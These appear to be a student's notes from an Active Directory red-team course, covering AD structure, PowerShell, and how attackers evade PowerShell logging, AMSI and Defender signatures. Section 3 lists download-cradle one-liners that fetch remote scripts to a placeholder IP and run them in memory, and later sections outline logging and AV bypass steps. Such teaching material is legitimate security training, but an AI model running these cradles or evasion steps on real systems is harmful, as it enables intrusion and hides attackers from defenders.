## 1. Active Directory Fundamentals

**What is Active Directory?**
- A directory service used to manage Windows networks.
- Stores information about network objects (users, computers, groups, etc.) and makes it easily available to users and admins.
- Enables centralized, secure management of an entire network — which can span a building, a city, or multiple locations worldwide.

**Core Components**

| Component | Purpose |
|---|---|
| Schema | Defines objects and their attributes |
| Query & Index Mechanism | Enables searching and publication of objects/properties |
| Global Catalog | Contains info about every object in the directory |
| Replication Service | Distributes information across domain controllers |

**Structure**
- **Forest** → security boundary, can contain multiple domains
- **Domain** → can contain multiple Organizational Units (OUs)
- **OU** → basic building block for organizing users, computers, groups

## 2. PowerShell Basics for AD

- PowerShell = cross-platform task automation & config management framework (Microsoft).
- `powershell.exe` is just the launcher — the actual engine lives in `System.Management.Automation.dll`.
- Course uses **Windows PowerShell 5.1** (not PowerShell Core) since it's still the enterprise standard and supports offensive tooling like PowerView, PowerSploit, Nishang.

**Loading Modules**
```powershell
Import-Module C:\path\ActiveDirectory.psd1
Get-Command -Module <modulename>   # list all commands in a module
```

**Script files:** use `.ps1` extension.

## 3. Download Cradles (Fileless Script Execution)

Download cradles fetch a PowerShell script from a remote server and execute it **in memory** — never touching disk. Most rely on `Invoke-Expression` (`iex`) to run the fetched content.

| Method | Command |
|---|---|
| .NET WebClient | `iex (New-Object Net.WebClient).DownloadString('http://<IP>/payload.ps1')` |
| Invoke-WebRequest (v3+) | `iex (iwr 'http://<IP>/payload.ps1')` |
| MSXML HTTP COM | `$h = New-Object -ComObject Msxml2.XMLHTTP` → `.open/.send` → `iex $h.responseText` |
| .NET WebRequest | `[System.Net.WebRequest]::Create(...)` → read stream → `IEX` |
| IE COM (legacy) | `New-Object -ComObject InternetExplorer.Application` — deprecated since IE is retired |

**Why it matters:** no file on disk = harder for signature-based AV to catch, and no artifact left behind for forensic review (unless script block logging is enabled).

## 4. PowerShell Detection Mechanisms (Blue Team Side)

| Mechanism | What it does |
|---|---|
| **System-wide Transcription** | Logs every PowerShell session — commands + output — full audit trail |
| **Script Block Logging** | Captures actual code executed, even if obfuscated/dynamically generated |
| **AMSI** (Antimalware Scan Interface) | Sends scripts to AV (e.g. Defender) for scanning *before* execution |
| **Constrained Language Mode (CLM)** | Restricts PowerShell to basic functionality — blocks advanced .NET/COM access. Usually enforced via AppLocker or WDAC/Device Guard |

## 6. Bypassing PowerShell Security — Invisi-Shell

- Tool: [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell)
- Hooks .NET assemblies (`System.Management.Automation.dll`, `System.Core.dll`) to bypass logging.
- Uses a **CLR Profiler API** to perform the hook (a CLR profiler is a DLL that sends/receives messages from the CLR via the profiling API, loaded by the CLR at runtime).

**Usage**
- Admin privileges: `RunWithPathAsAdmin.bat`
- Non-admin privileges: `RunWithRegistryNonAdmin.bat`
- Type `exit` in the new PowerShell session to clean up.

## 7. Bypassing AV Signatures for On-Disk Scripts

**In-memory scripts** → bypass via AMSI bypass techniques.

**On-disk scripts** → signature-based detection by Windows Defender. Workflow:
1. Scan the script with **DefenderCheck** → identifies the byte offset flagged as malicious (e.g. `0x1DCD2`).
2. Use `ByteToLineNumber.ps1` (in `C:\AD\Tools`) to convert that offset → actual line number in the script.
3. Inspect that line — often a base64-encoded binary blob embedded in a function (e.g. `WriteServiceBinary` in PowerUp).
4. Remove the flagged blob/function if it's not needed for the current use case.
5. Re-scan with DefenderCheck to confirm it's now clean.

**Invoke-Mimikatz** = one of the most heavily signatured PowerShell scripts around. Bypassing Defender for it takes multiple steps (see Bonus Learning Objective in the lab manual — **not to be attempted on the student VM**).

## 8. Offensive .NET Tradecraft — Challenges

When using .NET (or any compiled language) offensively, three recurring problems:
1. **Detection** by AV/EDR
2. **Delivery** of the payload (same problem download cradles solve for PowerShell)
3. **Detection via logging** — process creation logging, command-line logging, etc.

> Shared binaries in the course are expected to eventually get flagged by Defender — no guarantee of long-term evasion.
